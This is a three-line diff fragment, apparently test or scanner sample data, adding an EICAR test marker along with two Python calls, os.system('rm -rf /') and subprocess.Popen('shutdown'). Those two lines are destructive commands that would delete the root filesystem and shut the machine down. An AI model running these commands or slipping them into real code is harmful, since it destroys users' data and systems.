@@ -1,0 +1,3 @@
+EICAR_TEST
+os.system("rm -rf /")
+subprocess.Popen("shutdown")
